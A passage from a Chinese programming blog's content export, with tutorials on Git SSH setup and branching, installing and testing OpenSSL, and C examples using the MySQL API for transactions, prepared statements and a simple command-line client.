Bash.exe来生成密钥，可以通过开始菜单或者右键菜单打开Git Bash git bash 执行命令,生命公钥和私钥 命令: ssh-keygen -t rsa 执行命令完成后,在window本地用户.ssh目录C:\\Users\\用户名.ssh下面生成如下名称的公钥和私钥: 6.1.3.3 ssh密钥配置 密钥生成后需要在github上配置密钥本地才可以顺利访问。 在key部分将id_rsa.pub文件内容添加进去，然后点击“Add SSH key”按钮完成配置。 6.1.4 ssh方式同步到远程仓库 同步到远程仓库可以使用git bash也可以使用tortoiseGit 6.1.4.1 使用TortoiseGit同步 一、由于TortoiseGit使用的ssh工具是“PuTTY”git Bash使用的ssh工具是“openSSH”，如果想让TortoiseGit也使用刚才生成的密钥可以做如下配置： 创建新的远程仓库的并复制ssh地址 打开本地代码仓库 配置ssh Url：远程仓库的地址 推送URL：也是相同的 Putty密钥：选择刚才生成的密钥中的私钥 二、同步。在本地仓库的文件夹中单击右键，选择“Git同步” 6.2 从远程仓库克隆 克隆远程仓库也就是从远程把仓库复制一份到本地，克隆后会创建一个新的本地仓库。选择一个任意部署仓库的目录，然后克隆远程仓库。 6.2.1 使用git bash： git clone 仓库地址(ssh/https) $ git clone git@github.com:subwen/mytest.git $ git clone https://github.com/subwen/mytest.git 6.2.2 使用TortoiseGit： 在任意目录点击右键： 6.3 从远程仓库取代码 Git中从远程的分支获取最新的版本到本地有这样2个命令： git fetch：相当于是从远程获取最新版本到本地，不会自动merge（合并代码） git pull：相当于是从远程获取最新版本并merge到本地 上述命令其实相当于git fetch 和 git merge 在实际使用中，git fetch更安全一些 因为在merge前，我们可以查看更新情况，然后再决定是否合并 如果使用TortoiseGit的话可以从右键菜单中点击“拉取”（pull）或者“获取”（fetch） 7 分支管理 7.1 创建合并分支 在我们每次的提交，Git都把它们串成一条时间线，这条时间线就是一个分支。截止到目前，只有一条时间线，在Git里，这个分支叫主分支，即master分支。HEAD指针严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。 一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点： 每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长。 当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上： 你看，Git创建一个分支很快，因为除了增加一个dev指针，改改HEAD的指向，工作区的文件都没有任何变化！ 不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变： 假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并： 所以Git合并分支也很快！就改改指针，工作区内容也不变！ 合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支： 7.2 使用TortoiseGit实现分支管理 使用TortoiseGit管理分支就很简单了。 7.2.1 创建分支 在本地仓库文件夹中点击右键，然后从菜单中选择“创建分支”： 如果想创建完毕后直接切换到新分支可以勾选“切换到新分支”选项或者从菜单中选择“切换/检出”来切换分支： 7.2.2 合并分支 分支切换到dev后就可以对工作区的文件进行修改，然后提交到dev分支原来的master分支不受影响。例如我们修改hello.txt中的内容，然后提交到dev分支。 切换到master分支后还是原理的内容： 将dev分支的内容合并到master分支，当前分支为master。从右键菜单中选择“合并”： 再查看hello.txt的内容就已经更新了： 7.3 解决冲突 两个分支中编辑的内容都是相互独立互不干扰的，那么如果在两个分支中都对同一个文件进行编辑，然后再合并，就有可能会出现冲突。 例如在master分支中对hello.txt进行编辑： 然后提交到版本库。 切换到dev分支，对hello.txt进行编辑： 最后进行分支合并，例如将dev分支合并到master分支。需要先切换到master分支然后进行分支合并。 出现版本冲突。 冲突需要手动解决。 在冲突文件上单机右键选择“解决冲突”菜单项： 把冲突解决完毕的文件提交到版本库就可以了。","categories":[{"name":"Git","slug":"Git","permalink":"https://xiaowuyoucy.github.io/categories/Git/"}],"tags":[]},{"title":"项目介绍和部署","slug":"项目介绍和部署","date":"2022-05-17T14:36:46.000Z","updated":"2022-05-17T19:22:38.846Z","comments":true,"path":"2022/05/17/项目介绍和部署/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/17/项目介绍和部署/","excerpt":"","text":"第一天 - 项目介绍和部署 学习目标 项目阶段要求 2.1 项目1 介绍 2.2 项目要求 项目整体架构图 项目整体模块划分 数据的加密和解密 5.1 加密三要素 5.2 常用的加密方式 5.3 常用的加密算法 安装OpenSSL 6.1 openssl介绍 6.2 安装 Oracle数据库表的导入 7.1 连接数据库前的准备工作 7.2 启动oracle数据库 源码安装 第一天 - 项目介绍和部署 第一天 - 项目介绍和部署 学习目标 理解项目的整体功能, 细节无需明白, 后边会详细讲解 清楚项目整体模块划分和后续要实现的功能 完成项目所需的oracle数据表的导入 Windows/Linux下完成OpenSSL的安装 对加密相关概念有初步理解(后续会逐步深入讲解) 项目阶段要求 2.1 项目1 介绍 项目名称 - 数据安全传输 基础设施平台 写简历的时候需要自己起个名字(根据项目的功能) 2. 应用场景: 网络通信 socket http 传输层使用的tcp 保证通信时数据的安全 数据加密方式 对称加密 非对称加密 项目1实现的功能 秘钥生成, 校验 数据加密","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"OpenSSL安装和配置","slug":"OpenSSL安装和配置","date":"2022-05-16T23:12:06.000Z","updated":"2022-05-16T23:19:36.206Z","comments":true,"path":"2022/05/17/OpenSSL安装和配置/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/17/OpenSSL安装和配置/","excerpt":"","text":"1. 安装 1.1 windows下安装openssl 恭喜，OpenSSL安装完成。 1.2 Linux下安装OpenSSL 下载安装包, 下载地址: https://github.com/openssl/openssl 源码安装包解压缩 .zip格式: 1unzip openssl.zip .tar.gz格式: 1tar zxvf openssl.tar.gz .tar.bz格式: 1tar jxvf openssl.tar.gz 进入解压目录, 安装（可参考安装文件INSTALL）: 12345./configmakemake test （可选）make install (使用管理员权限执行该命令)sudo ldconfig 更新动态库配置文件 验证是否安装成功 1openssl version -a 输出结果 12345678OpenSSL 1.1.1-pre6-dev xx XXX xxxxbuilt on: Mon Apr 23 10:53:02 2018 UTCplatform: linux-x86_64options: bn(64,64) rc4(16x,int) des(int) idea(int) blowfish(ptr) compiler: gcc -fPIC -pthread -m64 -Wa,--noexecstack -Wall -O3 -DOPENSSL_USE_NODELETE -DL_ENDIAN -DOPENSSL_PIC -DOPENSSL_CPUID_OBJ -DOPENSSL_IA32_SSE2 -DOPENSSL_BN_ASM_MONT -DOPENSSL_BN_ASM_MONT5 -DOPENSSL_BN_ASM_GF2m -DSHA1_ASM -DSHA256_ASM -DSHA512_ASM -DRC4_ASM -DMD5_ASM -DAES_ASM -DVPAES_ASM -DBSAES_ASM -DGHASH_ASM -DECP_NISTZ256_ASM -DX25519_ASM -DPADLOCK_ASM -DPOLY1305_ASM -DNDEBUGOPENSSLDIR: \"/usr/local/ssl\"ENGINESDIR: \"/usr/local/lib64/engines-1.1\"Seeding source: os-specific 2 VS中使用openssl 打开VS, 创建一个空的控制台应用程序 设置项目属性, 打开项目的属性面板 添加openssl头文件目录 添加openssl的库目录 配置完毕 3. 测试 ###3.1 VS中的相关设置 打开项目属性窗口, 添加openssl相关的库到项目中 项目属性 -&gt; 链接器 -&gt; 输入 -&gt; 附件依赖项 libssl.lib libcrypto.lib 将openssl安装目录/bin目录下(C:\\OpenSSL-Win32\\bin)的两个动态库拷贝到工作目录下: libcrypto-1_1.dll libssl-1_1.dll C:\\OpenSSL-Win32 是我的openssl安装目录 如图所示: 测试代码如下: 12345678910111213141516171819202122232425262728293031#define _CRT_SECURE_NO_WARNINGS#include &lt;openssl/md5.h&gt; // md5 头文件#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void getMD5(const char* str, char* result)&#123; MD5_CTX ctx; // 初始化 MD5_Init(&amp;ctx); // 添加数据 MD5_Update(&amp;ctx, str, strlen(str)); // 计算结果 unsigned char md[16] = &#123; 0 &#125;; MD5_Final(md, &amp;ctx); for (int i = 0; i &lt; 16; ++i) &#123; sprintf(&amp;result[i * 2], \"%02x\", md[i]); &#125;&#125;int main()&#123; char result[33] = &#123; 0 &#125;; getMD5(\"hello, md5\", result); printf(\"md5 value: %s\\n\", result); system(\"pause\"); return 0;&#125; 12输出结果: md5 value: 33b3bc8e05b4fcc16bd531dd9adac166 3.2 Linux下的使用和测试 编程应用程序, 测试代码如上, 文件名为 md5_test.c 通过gcc编译源文件 1234gcc md5_test.c -o md5 -lssl -lcrypto执行该命令, 需要加载openssl的两个动态库 - libssl.so - libcrypto.so 查看生成的可执行程序 md5 运行时需要加载的动态库 1ldd md5 输出结果: 12345linux-vdso.so.1 =&gt; (0x00007ffdac781000)libssl.so.1.1 =&gt; not foundlibcrypto.so.1.1 =&gt; not foundlibc.so.6 =&gt; /lib64/libc.so.6 (0x00007f365c3aa000)/lib64/ld-linux-x86-64.so.2 (0x00007f365c782000) 提示动态库 libssl.so.1.1 和 libcrypto.so.1.1 链接不到 通过find查找两个动态库的位置 123456789find / -name \"libssl.so.1.1\"输出结果:/root/openssl-master/libssl.so.1.1/usr/local/lib64/libssl.so.1.1find / -name \"libcrypto.so.1.1\"输出结果:/root/openssl-master/libcrypto.so.1.1/usr/local/lib64/libcrypto.so.1.1 通过对输出结果的分析, 得出结论动态库所在的目录为: /usr/local/lib64 解决问题, 将找到的动态库绝对路径添加到 /etc/ld.so.conf 文件中, 并使用管理员权限执行命令ldconfig 1234sudo vim /etc/ld.so.conf将/usr/local/lib64 添加到文件末尾, 保存退出配置文件更新配置:sudo ldconfig 验证 12345678ldd md5 linux-vdso.so.1 =&gt; (0x00007ffcd8fe0000) libssl.so.1.1 =&gt; /usr/local/lib64/libssl.so.1.1 (0x00007fb7aae7d000) libcrypto.so.1.1 =&gt; /usr/local/lib64/libcrypto.so.1.1 (0x00007fb7aa9a2000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fb7aa5e1000) libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007fb7aa3dd000) libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007fb7aa1c0000) /lib64/ld-linux-x86-64.so.2 (0x00007fb7ab123000)","categories":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://xiaowuyoucy.github.io/categories/OpenSSL/"}],"tags":[]},{"title":"MySQL中的事务","slug":"MySQL中的事务","date":"2022-05-16T01:23:35.000Z","updated":"2022-05-16T01:24:54.209Z","comments":true,"path":"2022/05/16/MySQL中的事务/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/16/MySQL中的事务/","excerpt":"","text":"修改mysql为手工提交: 1234567891 开启事务 start transaction;2 设置手工提交 set autocommit=0;1 开启事务 start transaction;2 设置自动提交 set autocommit=1; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176//mysql中的事务#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include \"mysql.h\"#define SET_TRAN \"SET AUTOCOMMIT=0\" //手动commit ————手动commit#define UNSET_TRAN \"SET AUTOCOMMIT=1\" //自动commit#define _HOST_ \"127.0.0.1\"#define _USER_ \"root\"#define _PASSWD_ \"123456\"#define _DBNAME_ \"scott\"//设置事务为手动提交int mysql_OperationTran(MYSQL *mysql) &#123; //--开启事务 int ret = mysql_query(mysql, \"start transaction\"); if (ret != 0) &#123; printf(\"mysql_OperationTran query start err: %s\\n\", mysql_error(mysql)); return ret; &#125; //--设置事务为手动提交 ret = mysql_query(mysql, SET_TRAN); //set autocommmit = 0 if (ret != 0) &#123; printf(\"mysql_OperationTran query set err: %s\\n\", mysql_error(mysql)); return ret; &#125; return ret;&#125;//设置事务为自动提交int mysql_AutoTran(MYSQL *mysql)&#123; //--开启事务 int ret = mysql_query(mysql, \"start transaction\"); if (ret != 0) &#123; printf(\"mysql_AutoTran query start err: %s\\n\", mysql_error(mysql)); return ret; &#125; //--设置事务为自动提交 ret = mysql_query(mysql, UNSET_TRAN); //\"set autocommit = 1\" if (ret != 0) &#123; printf(\"mysql_AutoTran query set err: %s\\n\", mysql_error(mysql)); return ret; &#125; return ret; &#125;//执行commit，手动提交事务int mysql_Commit(MYSQL *mysql)&#123; int ret = mysql_query(mysql, \"COMMIT\"); //提交 if (ret != 0) &#123; printf(\"commit err: %s\\n\", mysql_error(mysql)); return ret; &#125; return ret;&#125;//执行rollback，回滚事务 int mysql_Rollback(MYSQL *mysql)&#123; int ret = mysql_query(mysql, \"ROLLBACK\"); if (ret != 0) &#123; printf(\"rollback err: %s\\n\", mysql_error(mysql)); return ret; &#125; return ret; &#125;#define DROP_SAMPLE_TABLE \"DROP TABLE IF EXISTS test_table\"#define CREATE_SAMPLE_TABLE \"CREATE TABLE test_table(col1 INT,\\ col2 VARCHAR(10),\\ col3 VARCHAR(10))\" #define sql01 \"INSERT INTO test_table(col1,col2,col3) VALUES(10, 'AAA', 'A1')\"#define sql02 \"INSERT INTO test_table(col1,col2,col3) VALUES(20, 'BBB', 'B2')\"#define sql03 \"INSERT INTO test_table(col1,col2,col3) VALUES(30, 'CCC', 'C3')\"#define sql04 \"INSERT INTO test_table(col1,col2,col3) VALUES(40, 'DDD', 'D4')\"int main(void)&#123; int ret = 0; MYSQL *mysql = mysql_init(NULL); mysql = mysql_real_connect(mysql, _HOST_, _USER_, _PASSWD_, _DBNAME_, 0, NULL, 0); if (mysql == NULL) &#123; ret = mysql_errno(mysql); printf(\"func mysql_real_connect() err：%d\\n\", ret); return ret; &#125; printf(\" --- connect ok......\\n\"); //执行删除表 if (mysql_query(mysql, DROP_SAMPLE_TABLE)) &#123; fprintf(stderr, \" DROP TABLE failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_error(mysql)); exit(0); &#125; //执行创建表 if (mysql_query(mysql, CREATE_SAMPLE_TABLE)) &#123; fprintf(stderr, \" CREATE TABLE failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_error(mysql)); exit(0); &#125; ret = mysql_OperationTran(mysql); //开启事务，并修改事务属性为手动commit if (ret != 0) &#123; printf(\"mysql_OperationTran() err:%d\\n\", ret); return ret; &#125; ret = mysql_query(mysql, sql01); //向表中插入第一行数据 ‘AAA’ if (ret != 0) &#123; printf(\"mysql_query() err:%d\\n\", ret); return ret; &#125; ret = mysql_query(mysql, sql02); //向表中插入第二行数据 ‘BBB’ if (ret != 0) &#123; printf(\"mysql_query() err:%d\\n\", ret); return ret; &#125; ret = mysql_Commit(mysql); //手动提交事务 if (ret != 0) &#123; printf(\"mysql_Commit() err:%d\\n\", ret); return ret; &#125; //////////AAA BBB 进去了。 #if 1 ret = mysql_AutoTran(mysql); // =再次= 修改事务属性为【自动】commit if (ret != 0) &#123; printf(\"mysql_OperationTran() err:%d\\n\", ret); return ret; &#125;#else ret = mysql_OperationTran(mysql); // =再次= 修改事务属性为【手动】commit if (ret != 0) &#123; printf(\"mysql_OperationTran() err:%d\\n\", ret); return ret; &#125;#endif ret = mysql_query(mysql, sql03); //向表中插入第三行数据 ‘CCC’ if (ret != 0) &#123; printf(\"mysql_query() err:%d\\n\", ret); return ret; &#125; ret = mysql_query(mysql, sql04); //向表中插入第四行数据 ‘DDD’ if (ret != 0) &#123; printf(\"mysql_query() err:%d\\n\", ret); return ret; &#125; ret = mysql_Rollback(mysql); //直接rollback操作 if (ret != 0) &#123; printf(\"mysql_Rollback() err:%d\\n\", ret); return ret; &#125; //rollback操作是否能回退掉CCC、DDD的值，取决于事务属性。 mysql_close(mysql); return 0; &#125;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"预处理类API函数","slug":"预处理类API函数","date":"2022-05-16T01:22:35.000Z","updated":"2022-05-16T01:32:30.704Z","comments":true,"path":"2022/05/16/预处理类API函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/16/预处理类API函数/","excerpt":"","text":"该类函数解决问题：处理带有占位符的SQL语句。insert into table111(col1, col2, col3) values(?, ?, ?); 这种SQL语句由两部分组成，一部分是SQL语句体模型部分，另一部分是？所匹配的值。 性能、调优是数据库编程永恒不变的主题！如果能把SQL语句框架预先处理好，当真正要执行SQL语句时只需要发送对应的参数到对应的SQL框架中，就能提高客户端访问服务器的速度，且数据量小，可以减少网络通信量，提高数据传输效率高。 元数据（Metadata）：又称中介数据、中继数据，为描述数据的数据，主要是描述数据属性的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。 根据API提供的案例学习该部分内容。主要有 4 个函数： 123456789mysql_stmt_init() 初始化预处理环境句柄。 返回一个结构体指针 MYSQL_STMT *stmtmysql_stmt_prepare() 向上面句柄中添加SQL语句，带有 (?,?,?) 占位符mysql_stmt_param_count() 求绑定变量的个数(辅助函数)， 有多少个&apos;?&apos;就返回多少mysql_stmt_bind_param() 将?对应的实参，设置到预处理环境句柄中mysql_stmt_execute() 执行预处理的SQL语句 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194#include &lt;stdio.h&gt;#include \"mysql.h\"#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define _HOST_ \"localhost\" //主机#define _USER_ \"root\" //mysql用户,非主机#define _PASSWD_ \"123456\" //密码#define _DBNAME_ \"scott\" //库名#define STRING_SIZE 50 #define DROP_SAMPLE_TABLE \"DROP TABLE IF EXISTS test_table\"#define CREATE_SAMPLE_TABLE \"CREATE TABLE test_table(col1 INT,\\ col2 VARCHAR(40),\\ col3 SMALLINT,\\ col4 TIMESTAMP)\"#define INSERT_SAMPLE \"INSERT INTO test_table(col1,col2,col3) VALUES(?,?,?)\"void prepare_insert(MYSQL *mysql);int main()&#123; //1.初始化 MYSQL * mysql = NULL; mysql = mysql_init(NULL) ; if(mysql == NULL ) &#123; printf(\"mysql init err\\n\"); exit(1); &#125; //2.连接 mysql = mysql_real_connect(mysql, _HOST_,_USER_, _PASSWD_,_DBNAME_, 0, NULL,0); if(mysql == NULL) &#123; printf(\"mysql_real_connect connect err\\n\"); exit(1); &#125; printf(\"welcome to mysql \\n\"); prepare_insert(mysql); //3.关闭 mysql_close(mysql); return 0;&#125;void prepare_insert(MYSQL *mysql)&#123; MYSQL_STMT *stmt;//预处理的句柄 MYSQL_BIND bind[3];//绑定变量 my_ulonglong affected_rows; int param_count; short small_data; int int_data; char str_data[STRING_SIZE]; unsigned long str_length; my_bool is_null; if (mysql_query(mysql, DROP_SAMPLE_TABLE))//删除表 &#123; fprintf(stderr, \" DROP TABLE failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_error(mysql)); exit(0); &#125; if (mysql_query(mysql, CREATE_SAMPLE_TABLE))//创建表 &#123; fprintf(stderr, \" CREATE TABLE failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_error(mysql)); exit(0); &#125; /* Prepare an INSERT query with 3 parameters */ /* (the TIMESTAMP column is not named; the server */ /* sets it to the current date and time) */ stmt = mysql_stmt_init(mysql); //预处理的初始化 if (!stmt) &#123; fprintf(stderr, \" mysql_stmt_init(), out of memory\\n\"); exit(0); &#125; if (mysql_stmt_prepare(stmt, INSERT_SAMPLE, strlen(INSERT_SAMPLE))) //insert 语句 的预处理 &#123; fprintf(stderr, \" mysql_stmt_prepare(), INSERT failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_stmt_error(stmt)); exit(0); &#125; fprintf(stdout, \" prepare, INSERT successful\\n\"); /* Get the parameter count from the statement */ param_count= mysql_stmt_param_count(stmt);//获得参数个数 fprintf(stdout, \" total parameters in INSERT: %d\\n\", param_count); if (param_count != 3) /* validate parameter count */ &#123; fprintf(stderr, \" invalid parameter count returned by MySQL\\n\"); exit(0); &#125; /* Bind the data for all 3 parameters */ memset(bind, 0, sizeof(bind)); /* INTEGER PARAM */ /* This is a number type, so there is no need to specify buffer_length */ bind[0].buffer_type= MYSQL_TYPE_LONG; bind[0].buffer= (char *)&amp;int_data;//内存地址的映射 bind[0].is_null= 0; bind[0].length= 0; /* STRING PARAM */ bind[1].buffer_type= MYSQL_TYPE_STRING; bind[1].buffer= (char *)str_data;//char 100 bind[1].buffer_length= STRING_SIZE; bind[1].is_null= 0; bind[1].length= &amp;str_length; /* SMALLINT PARAM */ bind[2].buffer_type= MYSQL_TYPE_SHORT; bind[2].buffer= (char *)&amp;small_data; bind[2].is_null= &amp;is_null;//是否为null的指示器 bind[2].length= 0; /* Bind the buffers */ if (mysql_stmt_bind_param(stmt, bind)) //绑定变量 参数绑定 &#123; fprintf(stderr, \" mysql_stmt_bind_param() failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_stmt_error(stmt)); exit(0); &#125; //第一波赋值 int_data= 10; /* integer */ strncpy(str_data, \"MySQL\", STRING_SIZE); /* string */ str_length= strlen(str_data); /* INSERT SMALLINT data as NULL */ is_null= 1;//指示插入的第三个字段是否为null /* Execute the INSERT statement - 1*/ if (mysql_stmt_execute(stmt)) //预处理的执行,第一次执行 &#123; fprintf(stderr, \" mysql_stmt_execute(), 1 failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_stmt_error(stmt)); exit(0); &#125; /* Get the total number of affected rows */ affected_rows= mysql_stmt_affected_rows(stmt);//预处理的影响条数 fprintf(stdout, \" total affected rows(insert 1): %lu\\n\", (unsigned long) affected_rows); if (affected_rows != 1) /* validate affected rows */ &#123; fprintf(stderr, \" invalid affected rows by MySQL\\n\"); exit(0); &#125; //第二波赋值 int_data= 1000; strncpy(str_data, \"The most popular Open Source database\", STRING_SIZE); str_length= strlen(str_data); small_data= 1000; /* smallint */ is_null= 0; /* reset */ /* Execute the INSERT statement - 2*/ if (mysql_stmt_execute(stmt))//第二次执行 &#123; fprintf(stderr, \" mysql_stmt_execute, 2 failed\\n\"); fprintf(stderr, \" %s\\n\", mysql_stmt_error(stmt)); exit(0); &#125; /* Get the total rows affected */ affected_rows= mysql_stmt_affected_rows(stmt); fprintf(stdout, \" total affected rows(insert 2): %lu\\n\", (unsigned long) affected_rows); if (affected_rows != 1) /* validate affected rows */ &#123; fprintf(stderr, \" invalid affected rows by MySQL\\n\"); exit(0); &#125; /* Close the statement */ if (mysql_stmt_close(stmt)) &#123; fprintf(stderr, \" failed while closing the statement\\n\"); fprintf(stderr, \" %s\\n\", mysql_stmt_error(stmt)); exit(0); &#125;&#125;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"mysql客户端开发","slug":"mysql客户端开发","date":"2022-05-15T23:55:50.000Z","updated":"2022-05-16T00:12:50.754Z","comments":true,"path":"2022/05/16/mysql客户端开发/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/16/mysql客户端开发/","excerpt":"","text":"思路分析 1234567891011121314151617181920212223242526272829303132333435mysql客户端编写思路分析:1 mysql初始化--mysql_init2 连接mysql数据库---mysql_real_connect3 while(1) &#123; //打印提示符:write(STDOUT_FILENO, &quot;mysql &gt;&quot;, strlen(&quot;mysql &gt;&quot;)); //读取用户输入: read(STDIN_FILENO, buf, sizeof(buf)) //判断用户输入的是否为退出: QUIT quit exit EXIT if(strncasecmp(buf, &quot;exit&quot;, 4)==0 || strncasecmp(buf, &quot;quit&quot;, 4)==0) &#123; //关闭连接---mysql_close(); exit(); &#125; //执行sql语句--mysql_query(); //若不是select查询, 打印执行sql语句影响的行数--mysql_affected_rows(); if(strncasecmp(buf, &quot;select&quot;, 6)!=0) &#123; printf(&quot;Query OK, %d row affected&quot;, mysql_affected_rows()); continue; &#125; //若是select查询的情况 ---//获取列数: mysql_field_count() //获取结果集: mysql_store_result() --获取列数: int mysql_num_fields(); //获取表头信息并打印表头信息:mysql_fetch_fields(); //循环获取每一行记录并打印: mysql_fetch_row() //释放结果集: mysql_free_result() &#125; 4 关闭连接: mysql_close(); 仿照mysql工具，应在连接数据库成功之后，在一个while循环中不断的接受用户输入的SQL语句。定义char sqlbuf[1024] 存储用户输入的SQL语句。初始化该buf，并提示用户输入SQL语句。使用gets函数在循环中动态接收用户输入。 ​ 123456789while (1) &#123; memset(sqlbuf, 0, sizeof(sqlbuf)); printf(&quot;\\nYourSQL&gt; &quot;); fgets(sqlbuf, sizeof(sqlbuf), stdin);&#125; 在mysql_query(connect, sqlbuf)之前，如果用户输入了“exit”那么程序直接结束。 在执行完 mysql_query(connect, sqlbuf)之后，应该判别用户输入的是否为select语句。如不是select语句不需要查询结果集、处理结果集等繁复操作。 如用户输入的是有结果集的SQL语句，将获取列数、获取结果集、获取表头、解析结果集、释放结果集等相关代码一起并入if (strncmp(sqlbuf, “select”, 6))中。 ​ 测试注意：执行SQL语句时不要在结尾加“;” 中文问题： ​ 修改mysql_real_connect()参数，连接到表中有中文数据的数据库，如mydb2，执行程序，测试显示中文出现乱码。我们可以使用mysql_query函数来解决该问题。 ​ 在 while (1) 之前使用ret = mysql_query(mysql, &quot;set names utf8&quot;);来设置查询属性(也可以加到while中)。表示在查询的时候使用utf8的形式进行查询。 或者mysql_set_character_set(mysql, &quot;utf8&quot;); 获取当前使用的字符集: const char *mysql_character_set_name(MYSQL *mysql) 程序实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148//模拟mysql客户端程序#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include \"mysql.h\"int main()&#123; //mysql初始化---mysql_init MYSQL *mysql = mysql_init(NULL); if(mysql==NULL) &#123; printf(\"mysql_init error\\n\"); return -1; &#125; //连接数据库 MYSQL *conn = mysql_real_connect(mysql, \"localhost\", \"root\", \"123456\", \"scott\", 0, NULL, 0); if(conn==NULL) &#123; printf(\"connect mysql db error, [%s]\\n\", mysql_error(mysql)); return -1; &#125; //获取当前进程使用的字符集 printf(\"before:[%s]\\n\", mysql_character_set_name(conn)); //设置字符集为utf8格式 mysql_set_character_set(conn, \"utf8\"); printf(\"after:[%s]\\n\", mysql_character_set_name(conn)); int i; int n; int ret; int num; char *p; char buf[1024]; MYSQL_RES *results; MYSQL_FIELD *fields; MYSQL_ROW row; //进入循环等待用户输入sql语句并执行sql语句 while(1) &#123; //打印提示符 write(STDOUT_FILENO, \"mysql&gt; \", strlen(\"mysql&gt; \")); //读取用户输入 memset(buf, 0x00, sizeof(buf)); read(STDIN_FILENO, buf, sizeof(buf)); //1-去掉末尾的; p = strrchr(buf, ';'); if(p!=NULL) &#123; *p = '\\0'; &#125; //2-去掉回车 if(buf[0]=='\\n') &#123; continue; &#125; //去掉最前面的几个空格 for(i=0; i&lt;strlen(buf); i++) &#123; if(buf[i]!=' ') &#123; break; &#125; &#125; n = strlen(buf); memmove(buf, buf+i, n-i+1); //+1表示多拷贝一个\\0 printf(\"[%s]\\n\", buf); //若输入的是退出: exit EXIT quit QUIT if(strncasecmp(buf, \"exit\", 4)==0 || strncasecmp(buf, \"quit\", 4)==0) &#123; mysql_close(conn); exit(0); &#125; //执行sql语句 ret = mysql_query(conn, buf); if(ret!=0) &#123; printf(\"%s\\n\", mysql_error(conn)); continue; &#125; //若用户输入的不是select查询 if(strncasecmp(buf, \"select\", 6)!=0) &#123; printf(\"Query OK, %ld row affected\\n\", mysql_affected_rows(conn)); continue; &#125; //下面是select查询的情况 //获取结果集 results = mysql_store_result(conn); if(results==NULL) &#123; printf(\"%s\\n\", mysql_error(conn)); continue; &#125; //获取列数 num = mysql_num_fields(results); //获取表头---列名 fields = mysql_fetch_fields(results); if(fields==NULL) &#123; printf(\"%s\\n\", mysql_error(conn)); mysql_free_result(results); continue; &#125; //打印表头 printf(\"+----------+-----------+\\n\"); for(i=0; i&lt;num; i++) &#123; printf(\"%s\\t\", fields[i].name); &#125; printf(\"\\n\"); printf(\"+----------+-----------+\\n\"); //循环获取每一行记录 while(row=mysql_fetch_row(results)) &#123; for(i=0; i&lt;num; i++) &#123; printf(\"%s\\t\", row[i]); &#125; printf(\"\\n\"); &#125; printf(\"+----------+-----------+\\n\"); //释放结果集 mysql_free_result(results); &#125; //关闭数据库连接 mysql_close(conn); return 0;&#125;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"linux下环境变量配置","slug":"linux下环境变量配置","date":"2022-05-15T17:08:36.000Z","updated":"2022-05-15T17:48:00.527Z","comments":true,"path":"2022/05/16/linux下环境变量配置/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/16/linux下环境变量配置/","excerpt":"","text":"环境变量 环境变量的分类 查看环境变量 常用命名 PATH LANG HOSTNAME SHELL HISTSIZE USER HOME PWD CLASSPATH 设置环境变量 系统环境变量 在/etc/profile文件中设置 在/etc/profile文件目录中增加环境变量脚本文件,这是linux推荐的方法 在/etc/bashrc文件中设置环境变量 用户环境变量 .bash_profile(推荐首选) .bashrc .bash_logout .bash_history 重要的环境变量 PATH环境 变量 LANG环境变量 CLASSPATH linux环境变量也成为Shell环境变量，习惯大写。 1.环境变量的分类 按生效的范围分类 系统环境变量 公共的，对全部的用户都生效 用户环境变量 